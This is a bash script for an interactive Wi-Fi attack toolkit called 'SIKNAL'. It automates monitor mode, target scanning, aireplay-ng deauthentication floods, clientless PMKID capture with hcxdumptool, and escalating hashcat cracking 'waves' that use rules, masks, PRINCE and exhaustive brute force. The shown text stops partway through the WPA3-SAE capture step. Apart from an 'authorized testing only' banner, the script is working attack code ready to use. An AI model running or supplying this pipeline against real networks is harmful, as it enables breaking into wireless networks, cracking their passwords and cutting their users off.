#!/usr/bin/env bash
#
# SIKNAL — Multi-protocol Wi-Fi assessment toolkit
# Supports: WPA, WPA2, WPA3-SAE, WPA2/WPA3-Transition, PMKID (clientless)
# Cracking: hashcat GPU with tiered wave-based escalating attack pipeline
# Target distro: BlackArch / Kali Linux
#
# ⚠️  AUTHORIZED TESTING ONLY — Only use on networks you own or have
#     explicit written permission to test. Unauthorized access is illegal.
#
set -euo pipefail

# ─── Colors ───────────────────────────────────────────────────────────
R='\033[0;31m'; G='\033[0;32m'; Y='\033[1;33m'; C='\033[0;36m'
M='\033[0;35m'; B='\033[1m'; D='\033[2m'; W='\033[1;37m'; N='\033[0m'

# ─── Helpers ──────────────────────────────────────────────────────────
banner() {
    echo -e "${R}${B}"
    cat << 'EOF'
  ███████ ██╗  ██╗██╗███████╗██╗  ██╗
  ██╔══██║██║  ██║██║██╔════╝██║  ██║
  ███████║███████║██║███████╗███████║
  ██╔══██║██╔══██║██║╚════██║██╔══██║
  ██║  ██║██║  ██║██║███████║██║  ██║
  ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝
     ███╗   ███╗ █████╗  ██████╗ ███████╗
     ████╗ ████║██╔══██╗██╔════╝ ██╔════╝
     ██╔████╔██║███████║██║  ███╗███████╗
     ██║╚██╔╝██║██╔══██║██║   ██║╚════██║
     ██║ ╚═╝ ██║██║  ██║╚██████╔╝███████║
     ╚═╝     ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝
EOF
    echo -e "${N}"
}

sep()   { echo -e "${D}══════════════════════════════════════════════════════════════════${N}"; }
sep2()  { echo -e "${D}── ── ── ── ── ── ── ── ── ── ── ── ── ── ── ── ── ── ── ──${N}"; }
info()  { echo -e "${C}[${B}*${N}${C}]${N} $1"; }
ok()    { echo -e "${G}[${B}✓${N}${G}]${N} $1"; }
warn()  { echo -e "${Y}[${B}!${N}${Y}]${N} $1"; }
err()   { echo -e "${R}[${B}✗${N}${R}]${N} $1"; }
step()  { echo -e "\n${M}┌─[ ${B}STEP $1${N}${M} ]${N}"; echo -e "${M}└─▶${N} $2"; }
pause() { echo -e "${D}     Press [Enter] to continue...${N}"; read -r; }

wave_banner() {
    local wave_num="$1"
    local wave_name="$2"
    local wave_desc="$3"
    echo
    echo -e "${B}${M}╔════════════════════════════════════════════════════════════╗${N}"
    echo -e "${B}${M}║  🌊  WAVE $wave_num: $wave_name"
    echo -e "${B}${M}║     $wave_desc"
    echo -e "${B}${M}╚════════════════════════════════════════════════════════════╝${N}"
    echo
}

# ─── Global state ─────────────────────────────────────────────────────
INTERFACE=""
MONITOR_IFACE=""
CHANNEL=""
BSSID=""
ROUTER_BSSID=""
DEAUTH_COUNT=5
WORDLIST="/usr/share/wordlists/rockyou.txt"
CAPTURE_FILE="capture_file"
WORKLOAD=3
OPT_KERNELS=""
STATUS_TIMER=10
ATTACK_MODE="waves"
ATTACK_NAME=""
RULE_FILE=""
SELECTED_RULES=""
MASK=""
SECOND_WORDLIST=""
HASH_FILE=""
CAP_FILE=""
GPU_AVAILABLE=0
HCX_AVAILABLE=0
RULES_DIR=""
PROTOCOL="auto"
ATTACK_VECTOR="auto"
SESSION_NAME="siknal_$(date +%s)"
EXTRA_WORDLISTS=()
USE_BRAIN=0
BRAIN_SERVER=""
MARKOV_THRESHOLD=0
PP64_AVAILABLE=0

# ─── Pre-flight checks ───────────────────────────────────────────────
preflight() {
    sep
    info "${B}SIKNAL — Pre-flight checks — verifying arsenal...${N}"
    sep2

    if [[ $EUID -ne 0 ]]; then
        err "Must be run as root. Try: sudo ./$0"
        exit 1
    fi
    ok "Running as root"

    local airtools=( airmon-ng airodump-ng aireplay-ng )
    for t in "${airtools[@]}"; do
        command -v "$t" &>/dev/null || { err "Missing: $t"; warn "Install: sudo pacman -S aircrack-ng || sudo apt install aircrack-ng"; exit 1; }
        echo -e "  ${G}✓${N} $t"
    done

    command -v hashcat &>/dev/null || { err "Missing: hashcat"; warn "Install: sudo pacman -S hashcat || sudo apt install hashcat"; exit 1; }
    ok "hashcat found"
    local hc_ver
    hc_ver=$(hashcat --version 2>/dev/null || echo "unknown")
    info "hashcat version: ${B}$hc_ver${N}"

    if command -v hcxpcapngtool &>/dev/null; then
        ok "hcxpcapngtool found (cap → hc22000 / PMKID extraction)"
        HCX_AVAILABLE=1
    else
        warn "hcxpcapngtool not found — REQUIRED for WPA3/PMKID"
        warn "Install: sudo pacman -S hcxtools || sudo apt install hcxtools"
        HCX_AVAILABLE=0
    fi

    if command -v hcxdumptool &>/dev/null; then
        ok "hcxdumptool found (WPA3-SAE / PMKID capture)"
    else
        warn "hcxdumptool not found — needed for WPA3-SAE capture"
        warn "Install: sudo pacman -S hcxdumptool || sudo apt install hcxdumptool"
    fi

    # Check princeprocessor
    if command -v pp64 &>/dev/null; then
        ok "princeprocessor (pp64) found — PRINCE attack available"
        PP64_AVAILABLE=1
    else
        warn "pp64 not found — PRINCE attack will use hashcat combinator fallback"
        PP64_AVAILABLE=0
    fi

    info "Checking GPU acceleration..."
    if hashcat -I 2>&1 | grep -qiE 'OpenCL|CUDA|HIP|Metal'; then
        ok "GPU/OpenCL backend(s) detected"
        GPU_AVAILABLE=1
        hashcat -I 2>&1 | grep -iE 'Backend|Device|OpenCL|CUDA|HIP|Metal' | head -10 | while read -r line; do
            echo -e "  ${C}${line}${N}"
        done
    else
        warn "No GPU backend detected — hashcat will use CPU (much slower)"
        warn "For GPU: install NVIDIA CUDA / AMD ROCm / Intel OpenCL drivers"
        GPU_AVAILABLE=0
    fi

    if [[ -f "$WORDLIST" ]]; then
        local wl_count
        wl_count=$(wc -l < "$WORDLIST" 2>/dev/null || echo "?")
        ok "Primary wordlist: $WORDLIST (${wl_count} entries)"
    elif [[ -f "${WORDLIST}.gz" ]]; then
        warn "Wordlist is gzipped: ${WORDLIST}.gz — decompress first"
    else
        warn "rockyou.txt not at default path — specify custom during input"
    fi

    local rdirs=( "/usr/share/hashcat/rules" "/usr/lib/hashcat/rules" "/opt/hashcat/rules" )
    RULES_DIR=""
    for rd in "${rdirs[@]}"; do
        [[ -d "$rd" ]] && { RULES_DIR="$rd"; ok "Rules directory: $rd"; break; }
    done
    [[ -z "$RULES_DIR" ]] && warn "No hashcat rules directory found"

    info "Detecting wireless interfaces..."
    local ifaces
    ifaces=$(iw dev 2>/dev/null | awk '/Interface/{print $2}')
    if [[ -n "$ifaces" ]]; then
        ok "Wireless interfaces:"
        echo -e "  ${C}${ifaces}${N}"
    else
        warn "No wireless interfaces detected — enter manually"
    fi

    sep
}

# ─── Protocol selection ───────────────────────────────────────────────
choose_protocol() {
    echo
    echo -e "${B}${M}╔══════════════════════════════════════════════════════════════════╗${N}"
    echo -e "${B}${M}║           📡  TARGET PROTOCOL & ATTACK VECTOR                   ║${N}"
    echo -e "${B}${M}╚══════════════════════════════════════════════════════════════════╝${N}"
    echo
    echo -e "  ${B}1)${N} ${C}WPA / WPA2 — Handshake Capture${N}       Classic 4-way handshake + deauth"
    echo -e "      ${D}airmon-ng → airodump-ng → aireplay-ng → .cap${N}"
    echo
    echo -e "  ${B}2)${N} ${C}WPA2 — PMKID (Clientless)${N}             No client needed! PMKID from AP"
    echo -e "      ${D}hcxdumptool → hcxpcapngtool → .hc22000${N}"
    echo
    echo -e "  ${B}3)${N} ${C}WPA3-SAE — SAE Handshake Capture${N}      Dragonfly handshake capture"
    echo -e "      ${D}hcxdumptool → hcxpcapngtool → .hc22000${N}"
    echo
    echo -e "  ${B}4)${N} ${C}WPA2/WPA3 Transition Mode${N}            Handles both PMKID + SAE"
    echo -e "      ${D}Auto-detects & captures everything available${N}"
    echo
    echo -e "  ${B}5)${N} ${C}Auto-Detect (Recommended)${N}            Scans, detects protocol, picks best vector"
    echo -e "      ${D}Tries PMKID first → falls back to handshake/SAE${N}"
    echo

    local pc
    while true; do
        read -rp "$(echo -e ${B}${G}Select protocol [1-5]: ${N})" pc
        case "$pc" in
            1) PROTOCOL="wpa2"; ATTACK_VECTOR="handshake"; break ;;
            2) PROTOCOL="wpa2"; ATTACK_VECTOR="pmkid"; break ;;
            3) PROTOCOL="wpa3"; ATTACK_VECTOR="sae"; break ;;
            4) PROTOCOL="transition"; ATTACK_VECTOR="auto"; break ;;
            5) PROTOCOL="auto"; ATTACK_VECTOR="auto"; break ;;
            *) warn "Invalid. Enter 1-5." ;;
        esac
    done
    info "Protocol: ${B}$PROTOCOL${N}  |  Vector: ${B}$ATTACK_VECTOR${N}"
}

# ─── Attack mode menu ─────────────────────────────────────────────────
choose_attack_mode() {
    echo
    echo -e "${B}${M}╔══════════════════════════════════════════════════════════════════╗${N}"
    echo -e "${B}${M}║           💀  HASHCAT ATTACK PIPELINE                           ║${N}"
    echo -e "${B}${M}╚══════════════════════════════════════════════════════════════════╝${N}"
    echo
    echo -e "  ${B}1)${N} ${C}Wave Auto-Pipeline (Recommended)${N}     4 escalating waves of increasing intensity"
    echo -e "      ${D}Wave 1: Rules → Wave 2: Hybrid/PRINCE → Wave 3: Masks → Wave 4: Exhaustive${N}"
    echo
    echo -e "  ${B}2)${N} ${C}Single Attack Mode${N}                    Pick one specific attack type"
    echo
    echo -e "  ${B}3)${N} ${C}Custom Wave Selection${N}                 Choose which waves to run"
    echo

    local c
    while true; do
        read -rp "$(echo -e ${B}${G}Select [1-3]: ${N})" c
        case "$c" in
            1) ATTACK_MODE="waves"; ATTACK_NAME="Wave Auto-Pipeline"; break ;;
            2) ATTACK_MODE="single"; ATTACK_NAME="Single Attack"; break ;;
            3) ATTACK_MODE="custom_waves"; ATTACK_NAME="Custom Wave Selection"; break ;;
            *) warn "Invalid. Enter 1-3." ;;
        esac
    done
    info "Attack: ${B}$ATTACK_NAME${N}"

    if [[ "$ATTACK_MODE" == "single" ]]; then
        choose_single_attack
    elif [[ "$ATTACK_MODE" == "custom_waves" ]]; then
        choose_custom_waves
    fi
}

# ─── Single attack selection ──────────────────────────────────────────
choose_single_attack() {
    echo
    echo -e "${B}${Y}Select attack type:${N}"
    echo
    echo -e "  ${B}1)${N} ${C}Straight (Dictionary)${N}"
    echo -e "  ${B}2)${N} ${C}Dictionary + Rules${N}"
    echo -e "  ${B}3)${N} ${C}Dictionary + Chained Rules${N}"
    echo -e "  ${B}4)${N} ${C}Combinator${N}"
    echo -e "  ${B}5)${N} ${C}Mask (Brute-Force)${N}"
    echo -e "  ${B}6)${N} ${C}Hybrid (Wordlist + Mask)${N}"
    echo -e "  ${B}7)${N} ${C}Hybrid (Mask + Wordlist)${N}"
    echo -e "  ${B}8)${N} ${C}PRINCE Attack${N}"
    echo -e "  ${B}9)${N} ${C}Keyboard-Walk Mask${N}"
    echo -e "  ${B}10)${N} ${C}Markov-Optimized Mask${N}"
    echo -e "  ${B}11)${N} ${C}Incremental (Exhaustive)${N}"
    echo

    local sa
    while true; do
        read -rp "$(echo -e ${B}${G}Select [1-11]: ${N})" sa
        case "$sa" in
            1)  SINGLE_MODE=0; SINGLE_NAME="Straight (Dictionary)"; break ;;
            2)  SINGLE_MODE=0; SINGLE_NAME="Dictionary + Rules"; SINGLE_USE_RULES=1; break ;;
            3)  SINGLE_MODE=0; SINGLE_NAME="Dictionary + Chained Rules"; SINGLE_MULTI_RULES=1; break ;;
            4)  SINGLE_MODE=1; SINGLE_NAME="Combinator"; break ;;
            5)  SINGLE_MODE=3; SINGLE_NAME="Mask (Brute-Force)"; break ;;
            6)  SINGLE_MODE=6; SINGLE_NAME="Hybrid (Wordlist + Mask)"; break ;;
            7)  SINGLE_MODE=7; SINGLE_NAME="Hybrid (Mask + Wordlist)"; break ;;
            8)  SINGLE_MODE="prince"; SINGLE_NAME="PRINCE Attack"; break ;;
            9)  SINGLE_MODE="keyboard"; SINGLE_NAME="Keyboard-Walk Mask"; break ;;
            10) SINGLE_MODE="markov"; SINGLE_NAME="Markov-Optimized Mask"; break ;;
            11) SINGLE_MODE="incremental"; SINGLE_NAME="Incremental (Exhaustive)"; break ;;
            *) warn "Invalid. Enter 1-11." ;;
        esac
    done
    info "Single attack: ${B}$SINGLE_NAME${N}"

    # Gather attack-specific inputs
    case "$SINGLE_MODE" in
        0)
            [[ "${SINGLE_USE_RULES:-0}" -eq 1 || "${SINGLE_MULTI_RULES:-0}" -eq 1 ]] && choose_rules
            ;;
        1)
            echo -e "\n${Y}Second wordlist (combinator):${N}"
            read -rp "   > " SECOND_WORDLIST
            while [[ ! -f "$SECOND_WORDLIST" ]]; do err "Not found"; read -rp "   > " SECOND_WORDLIST; done
            ;;
        3|6|7) input_mask ;;
        prince)
            echo -e "\n${Y}PRINCE: dictionary file for candidate generation${N}"
            echo -e "   ${D}Usually your main wordlist${N}"
            ;;
        incremental)
            echo -e "\n${Y}Incremental: charset for exhaustive search${N}"
            echo -e "  ${B}1)${N} ?a (all printable)"
            echo -e "  ${B}2)${N} ?l?d (lower+digits)"
            echo -e "  ${B}3)${N} Custom mask"
            local ic; read -rp "  > [1-3]: " ic
            case "$ic" in
                1) MASK="?a?a?a?a?a?a?a?a?a?a" ;;
                2) MASK="?l?d?l?d?l?d?l?d?l?d" ;;
                3) input_mask ;;
                *) MASK="?a?a?a?a?a?a?a?a?a?a" ;;
            esac
            ;;
    esac
}

# ─── Custom wave selection ────────────────────────────────────────────
choose_custom_waves() {
    echo
    echo -e "${B}${Y}Select which waves to run (comma-separated):${N}"
    echo
    echo -e "  ${B}1)${N} ${C}Wave 1: Rules${N} — Dictionary + best64 + rockyou-30000"
    echo -e "  ${B}2)${N} ${C}Wave 2: Hybrid & PRINCE${N} — Wordlist+mask, PRINCE, combinator"
    echo -e "  ${B}3)${N} ${C}Wave 3: Targeted Masks${N} — Common patterns, keyboard-walks, custom charsets"
    echo -e "  ${B}4)${N} ${C}Wave 4: Exhaustive${N} — Markov-optimized, incremental, full brute"
    echo
    read -rp "$(echo -e ${B}${G}Waves to run [e.g. 1,3,4]: ${N})" wave_choices
    SELECTED_WAVES=""
    IFS=',' read -ra wave_indices <<< "$wave_choices"
    for idx in "${wave_indices[@]}"; do
        idx=$(echo "$idx" | xargs)
        case "$idx" in
            1) SELECTED_WAVES="${SELECTED_WAVES:+$SELECTED_WAVES,}1" ;;
            2) SELECTED_WAVES="${SELECTED_WAVES:+$SELECTED_WAVES,}2" ;;
            3) SELECTED_WAVES="${SELECTED_WAVES:+$SELECTED_WAVES,}3" ;;
            4) SELECTED_WAVES="${SELECTED_WAVES:+$SELECTED_WAVES,}4" ;;
            *) warn "Skipping invalid wave: $idx" ;;
        esac
    done
    [[ -z "$SELECTED_WAVES" ]] && { warn "No valid waves — running all"; SELECTED_WAVES="1,2,3,4"; }
    info "Selected waves: ${B}$SELECTED_WAVES${N}"
}

# ─── Rule file selection ──────────────────────────────────────────────
choose_rules() {
    SINGLE_USE_RULES=${SINGLE_USE_RULES:-0}
    SINGLE_MULTI_RULES=${SINGLE_MULTI_RULES:-0}

    if [[ -z "$RULES_DIR" ]]; then
        warn "No rules directory — rules unavailable"
        SINGLE_USE_RULES=0; SINGLE_MULTI_RULES=0; return
    fi

    echo
    echo -e "${B}${Y}Available rule files:${N}"
    echo
    local rules=()
    local i=1
    while IFS= read -r f; do
        local fname; fname=$(basename "$f")
        local fsize; fsize=$(wc -l < "$f" 2>/dev/null || echo "?")
        rules+=("$f")
        local tag=""
        case "$fname" in
            *best64*)         tag="${G}★ recommended starter${N}" ;;
            *rockyou-30000*)  tag="${G}★ high coverage${N}" ;;
            *OneRule*)        tag="${G}★ one rule to rule them all${N}" ;;
            *d3ad0ne*)        tag="${G}★ comprehensive${N}" ;;
            *Incisive*)       tag="${G}★ surgical${N}" ;;
            *T0XlC*)          tag="${G}★ aggressive${N}" ;;
            *leetspeak*)      tag="${C}★ leet mutations${N}" ;;
        esac
        printf "  ${B}%2d)${N} ${C}%-30s${N} ${D}(%6s rules)${N} %b\n" "$i" "$fname" "$fsize" "$tag"
        ((i++))
    done < <(find "$RULES_DIR" -name '*.rule' -type f 2>/dev/null | sort)

    echo
    echo -e "  ${B}0)${N} ${D}Custom rule file path${N}"
    echo

    if [[ "${SINGLE_MULTI_RULES:-0}" -eq 1 ]]; then
        echo -e "${Y}Select multiple rules (comma-separated, e.g. 1,3,7):${N}"
        read -rp "  > Rules: " rule_choices
        SELECTED_RULES=""
        IFS=',' read -ra indices <<< "$rule_choices"
        for idx in "${indices[@]}"; do
            idx=$(echo "$idx" | xargs)
            if [[ "$idx" == "0" ]]; then
                read -rp "  Custom rule path: " cr
                [[ -f "$cr" ]] && { SELECTED_RULES="${SELECTED_RULES:+$SELECTED_RULES,}$cr"; ok "Added: $cr"; } || err "Not found: $cr"
            elif [[ "$idx" =~ ^[0-9]+$ && "$idx" -ge 1 && "$idx" -le ${#rules[@]} ]]; then
                SELECTED_RULES="${SELECTED_RULES:+$SELECTED_RULES,}${rules[$((idx-1))]}"
                ok "Added: $(basename "${rules[$((idx-1))]}")"
            else
                warn "Skipping invalid: $idx"
            fi
        done
        [[ -z "$SELECTED_RULES" ]] && { warn "No valid rules — straight dictionary"; SINGLE_MULTI_RULES=0; }
    else
        read -rp "$(echo -e ${B}${G}Select rule [0=custom]: ${N})" rc
        if [[ "$rc" == "0" ]]; then
            read -rp "  Custom path: " RULE_FILE
            [[ ! -f "$RULE_FILE" ]] && { err "Not found: $RULE_FILE"; warn "No rules"; SINGLE_USE_RULES=0; }
        elif [[ "$rc" =~ ^[0-9]+$ && "$rc" -ge 1 && "$rc" -le ${#rules[@]} ]]; then
            RULE_FILE="${rules[$((rc-1))]}"
            ok "Selected: $(basename "$RULE_FILE")"
        else
            warn "Invalid — no rules"; SINGLE_USE_RULES=0
        fi
    fi
}

# ─── Mask builder ─────────────────────────────────────────────────────
input_mask() {
    echo
    echo -e "${B}${Y}Mask Builder — Charset Placeholders:${N}"
    echo
    echo -e "  ${C}?l${N} = lowercase           ${C}?u${N} = UPPERCASE"
    echo -e "  ${C}?d${N} = digits 0-9          ${C}?s${N} = special chars"
    echo -e "  ${C}?a${N} = ?l?u?d?s (all)      ${C}?b${N} = 0x00-0xFF (binary)"
    echo
    echo -e "  ${D}Custom charset: ?1 ?2 ?3 ?4 — define with --custom-charset1='abc123'${N}"
    echo
    echo -e "  ${B}Common patterns:${N}"
    echo -e "    ${D}?d?d?d?d?d?d?d?d               8-digit PIN${N}"
    echo -e "    ${D}?l?l?l?l?l?l?l?l               8 lowercase${N}"
    echo -e "    ${D}?u?l?l?l?l?l?d?d?d             Capital+5lower+3digits${N}"
    echo -e "    ${D}?a?a?a?a?a?a?a?a               8 all-printable (covers strong pw)${N}"
    echo
    read -rp "$(echo -e ${B}${G}Enter mask: ${N})" MASK
    while [[ -z "$MASK" ]]; do
        err "Mask required"
        read -rp "$(echo -e ${B}${G}Enter mask: ${N})" MASK
    done
    info "Mask: ${B}$MASK${N}"
}

# ─── Interactive input ───────────────────────────────────────────────
gather_input() {
    SINGLE_USE_RULES=0; SINGLE_MULTI_RULES=0; SINGLE_MODE=""; SINGLE_NAME=""
    RULE_FILE=""; SELECTED_RULES=""; MASK=""; SECOND_WORDLIST=""; SELECTED_WAVES=""

    choose_protocol

    echo
    echo -e "${B}${C}╔══════════════════════════════════════════════════════════════════╗${N}"
    echo -e "${B}${C}║           🎯  TARGET CONFIGURATION                               ║${N}"
    echo -e "${B}${C}╚══════════════════════════════════════════════════════════════════╝${N}"
    echo

    echo -e "${Y}1) Wireless Interface${N} ${D}(Enter=wlan0)${N}"
    read -rp "   > " INTERFACE; INTERFACE="${INTERFACE:-wlan0}"

    echo -e "\n${Y}2) Target Channel${N} ${D}(e.g. 6, 11, 36)${N}"
    read -rp "   > " CHANNEL
    while [[ -z "$CHANNEL" ]]; do err "Required"; read -rp "   > " CHANNEL; done

    echo -e "\n${Y}3) Target BSSID (MAC)${N} ${D}(AA:BB:CC:DD:EE:FF)${N}"
    read -rp "   > " BSSID
    while [[ -z "$BSSID" ]]; do err "Required"; read -rp "   > " BSSID; done

    echo -e "\n${Y}4) Deauth Target BSSID${N} ${D}(Enter=same)${N}"
    read -rp "   > " ROUTER_BSSID; ROUTER_BSSID="${ROUTER_BSSID:-$BSSID}"

    echo -e "\n${Y}5) Deauth Packets${N} ${D}(Enter=5)${N}"
    read -rp "   > " DEAUTH_COUNT; DEAUTH_COUNT="${DEAUTH_COUNT:-5}"

    echo -e "\n${Y}6) Primary Wordlist${N} ${D}(Enter=rockyou.txt)${N}"
    read -rp "   > " WORDLIST; WORDLIST="${WORDLIST:-/usr/share/wordlists/rockyou.txt}"

    echo -e "\n${Y}7) Additional Wordlists${N} ${D}(comma-separated paths, Enter=skip)${N}"
    echo -e "   ${D}These are chained after primary wordlist fails${N}"
    read -rp "   > " extra_wls
    if [[ -n "$extra_wls" ]]; then
        IFS=',' read -ra EXTRA_WORDLISTS <<< "$extra_wls"
        for wl in "${EXTRA_WORDLISTS[@]}"; do
            wl=$(echo "$wl" | xargs)
            [[ -f "$wl" ]] && ok "Added: $wl" || warn "Not found: $wl (skipped)"
        done
    fi

    echo -e "\n${Y}8) Capture File Prefix${N} ${D}(Enter=capture_file)${N}"
    read -rp "   > " CAPTURE_FILE; CAPTURE_FILE="${CAPTURE_FILE:-capture_file}"

    echo -e "\n${Y}9) Hashcat Workload Profile${N} ${D}(1=Low 2=Default 3=High 4=Nightmare)${N}"
    echo -e "   ${D}Higher = faster but more GPU stress/heat${N}"
    read -rp "   > " WORKLOAD; WORKLOAD="${WORKLOAD:-3}"

    echo -e "\n${Y}10) Optimized Kernels${N} ${D}(faster, limits pw to 31 chars) [y/N]${N}"
    read -rp "   > " OPT_KERNELS

    echo -e "\n${Y}11) Status Timer${N} ${D}(seconds, 0=off, Enter=10)${N}"
    read -rp "   > " STATUS_TIMER; STATUS_TIMER="${STATUS_TIMER:-10}"

    echo -e "\n${Y}12) Session Name${N} ${D}(for save/restore, Enter=auto)${N}"
    read -rp "   > " sn; SESSION_NAME="${sn:-$SESSION_NAME}"

    # Brain / Distributed
    echo -e "\n${Y}13) Brain / Distributed Cracking${N} ${D}(y/N)${N}"
    echo -e "   ${D}Enables hashcat --brain for multi-GPU coordination${N}"
    read -rp "   > " brain_yn
    if [[ "${brain_yn,,}" =~ ^y ]]; then
        USE_BRAIN=1
        read -rp "   Brain server IP (Enter=localhost): " BRAIN_SERVER
        BRAIN_SERVER="${BRAIN_SERVER:-localhost}"
        ok "Brain mode enabled — server: $BRAIN_SERVER"
    else
        USE_BRAIN=0
    fi

    # Markov threshold
    echo -e "\n${Y}14) Markov Threshold${N} ${D}(0=off, 300=recommended for mask attacks)${N}"
    echo -e "   ${D}Prioritizes likely character transitions to reduce keyspace${N}"
    read -rp "   > " MARKOV_THRESHOLD; MARKOV_THRESHOLD="${MARKOV_THRESHOLD:-0}"
    [[ "$MARKOV_THRESHOLD" != "0" ]] && ok "Markov enabled — threshold: $MARKOV_THRESHOLD"

    choose_attack_mode

    MONITOR_IFACE="${INTERFACE}mon"

    # ─── Summary ─────────────────────────────────────────────────────
    echo
    sep
    echo -e "${B}${W}  📋  OPERATION SUMMARY${N}"
    sep
    echo -e "  ${C}Protocol        :${N} $PROTOCOL"
    echo -e "  ${C}Attack vector   :${N} $ATTACK_VECTOR"
    echo -e "  ${C}Interface       :${N} $INTERFACE → $MONITOR_IFACE"
    echo -e "  ${C}Channel         :${N} $CHANNEL"
    echo -e "  ${C}BSSID           :${N} $BSSID"
    echo -e "  ${C}Deauth BSSID    :${N} $ROUTER_BSSID (${DEAUTH_COUNT} pkts)"
    echo -e "  ${C}Capture file    :${N} $CAPTURE_FILE"
    echo -e "  ${C}Wordlist        :${N} $WORDLIST"
    [[ ${#EXTRA_WORDLISTS[@]} -gt 0 ]] && echo -e "  ${C}Extra wordlists  :${N} ${EXTRA_WORDLISTS[*]}"
    echo -e "  ${C}Attack pipeline :${N} $ATTACK_NAME"
    [[ -n "$SELECTED_WAVES" ]] && echo -e "  ${C}Selected waves  :${N} $SELECTED_WAVES"
    [[ -n "$SINGLE_NAME" ]] && echo -e "  ${C}Single attack   :${N} $SINGLE_NAME"
    [[ -n "$RULE_FILE" ]]       && echo -e "  ${C}Rule file       :${N} $RULE_FILE"
    [[ -n "$SELECTED_RULES" ]]  && echo -e "  ${C}Chained rules   :${N} $SELECTED_RULES"
    [[ -n "$MASK" ]]            && echo -e "  ${C}Mask            :${N} $MASK"
    [[ -n "$SECOND_WORDLIST" ]] && echo -e "  ${C}2nd wordlist    :${N} $SECOND_WORDLIST"
    echo -e "  ${C}Workload        :${N} -w $WORKLOAD"
    [[ "${OPT_KERNELS,,}" =~ ^y ]] && echo -e "  ${C}Opt. kernels    :${N} Yes"
    [[ "$STATUS_TIMER" != "0" ]]   && echo -e "  ${C}Status timer    :${N} ${STATUS_TIMER}s"
    echo -e "  ${C}Session         :${N} $SESSION_NAME"
    echo -e "  ${C}Brain/distributed:${N} $([[ $USE_BRAIN -eq 1 ]] && echo "✅ $BRAIN_SERVER" || echo 'Off')"
    echo -e "  ${C}Markov threshold:${N} $MARKOV_THRESHOLD"
    echo -e "  ${C}GPU backend     :${N} $([[ $GPU_AVAILABLE -eq 1 ]] && echo '✅ Available' || echo '⚠️  CPU-only')"
    sep
    echo

    read -rp "$(echo -e ${B}${G}Proceed? [y/N] ${N})" CONFIRM
    [[ "${CONFIRM,,}" =~ ^y(es)?$ ]] || { warn "Aborted."; exit 0; }
}

# ─── Build hashcat base command ───────────────────────────────────────
build_hc_base() {
    local HC="hashcat -m 22000"
    HC+=" -w $WORKLOAD"
    HC+=" --session=$SESSION_NAME"
    HC+=" --potfile-path=./${SESSION_NAME}.potfile"
    [[ "${OPT_KERNELS,,}" =~ ^y ]] && HC+=" -O"
    [[ "$STATUS_TIMER" != "0" ]] && HC+=" --status --status-timer=$STATUS_TIMER"
    [[ "$GPU_AVAILABLE" -eq 1 ]] && HC+=" --force"
    # Brain/distributed
    if [[ "$USE_BRAIN" -eq 1 ]]; then
        HC+=" --brain-client --brain-host=$BRAIN_SERVER"
    fi
    # Markov threshold
    [[ "$MARKOV_THRESHOLD" != "0" ]] && HC+=" --markov-threshold=$MARKOV_THRESHOLD"
    echo "$HC"
}

# ─── Capture: WPA/WPA2 Handshake ──────────────────────────────────────
capture_handshake() {
    step "1" "Starting monitor mode on ${B}$INTERFACE${N}"
    sep2; sudo airmon-ng start "$INTERFACE"; ok "Monitor mode: $MONITOR_IFACE"; pause

    step "2" "Scanning for targets on ${B}$MONITOR_IFACE${N}"
    echo -e "  ${Y}Identify your target's BSSID & channel.${N}"
    echo -e "  ${Y}Press ${B}Ctrl+C${N}${Y} when done.${N}"
    sep2; sudo airodump-ng "$MONITOR_IFACE"; pause

    step "3" "Locking onto target — BSSID ${B}$BSSID${N}, CH ${B}$CHANNEL${N}"
    echo -e "  ${Y}Keep this running — open ${B}new terminal${N}${Y} for deauth.${N}"
    echo -e "  ${Y}Watch for ${B}\"WPA handshake: <MAC>\"${N}${Y} in output.${N}"
    echo -e "  ${Y}Press ${B}Ctrl+C${N}${Y} after handshake captured.${N}"
    sep2; sudo airodump-ng -c "$CHANNEL" --bssid "$BSSID" -w "$CAPTURE_FILE" "$MONITOR_IFACE"
    ok "Capture session ended"; pause

    step "4" "Deauth — ${B}$DEAUTH_COUNT${N} packets to ${B}$ROUTER_BSSID${N}"
    echo -e "  ${Y}Run in separate terminal while Step 3 is active.${N}"
    sep2; sudo aireplay-ng --deauth "$DEAUTH_COUNT" -a "$ROUTER_BSSID" "$MONITOR_IFACE"
    ok "Deauth sent"; pause
}

# ─── Capture: PMKID (Clientless) ──────────────────────────────────────
capture_pmkid() {
    step "1" "Starting monitor mode on ${B}$INTERFACE${N}"
    sep2; sudo airmon-ng start "$INTERFACE"; ok "Monitor mode: $MONITOR_IFACE"; pause

    step "2" "PMKID capture via hcxdumptool (clientless)"
    echo -e "  ${Y}No client/deauth needed — PMKID requested directly from AP.${N}"
    echo -e "  ${D}Note: Not all APs respond to PMKID requests.${N}"
    sep2
    local pcap_out="${CAPTURE_FILE}_pmkid.pcapng"
    info "Target BSSID: $BSSID  Channel: $CHANNEL"

    if hcxdumptool --help 2>&1 | grep -q 'filterlist_ap'; then
        echo "$BSSID" > /tmp/siknal_filter_ap.txt
        sudo hcxdumptool -i "$MONITOR_IFACE" --filterlist_ap=/tmp/siknal_filter_ap.txt \
            --filtermode=2 -c "$CHANNEL" -o "$pcap_out" --active_backend --rcv_client_m1 --stay=15
    else
        sudo hcxdumptool -i "$MONITOR_IFACE" --channel="$CHANNEL" --target_ap="$BSSID" \
            -o "$pcap_out" --enable_status=15
    fi
    ok "PMKID capture attempt complete: $pcap_out"; pause

    step "3" "Converting PMKID capture → hc22000"; sep2
    local hc_out="${CAPTURE_FILE}.hc22000"
    hcxpcapngtool -o "$hc_out" "$pcap_out" 2>&1 || true
    if [[ -f "$hc_out" && -s "$hc_out" ]]; then
        local hc_count; hc_count=$(wc -l < "$hc_out" | tr -d ' ')
        ok "Extracted ${hc_count} hash(es) → $hc_out"; HASH_FILE="$hc_out"
    else
        err "No hashes extracted — AP may not support PMKID"
        warn "Try handshake or SAE capture instead"; return 1
    fi
}

# ─── Capture: WPA3-SAE ────────────────────────────────────────────────
capture_sae() {
    step "1" "Starting monitor mode on ${B}$INTERFACE${N}"
    sep2; sudo airmon-ng start "$INTERFACE"; ok "Monitor mode: $MONITOR_IFACE"; pause

    step "2" "WPA3-SAE handshake capture via hcxdumptool"
    echo -e "  ${Y}Capturing SAE (Dragonfly) commit/confirm exchanges.${N}"
    echo -e "  ${Y}WPA3 doesn't use traditional deauth — passive/active capture.${N}"
    sep2
    local pcap_out="${CAPTURE_FILE}_sae.pcapng"
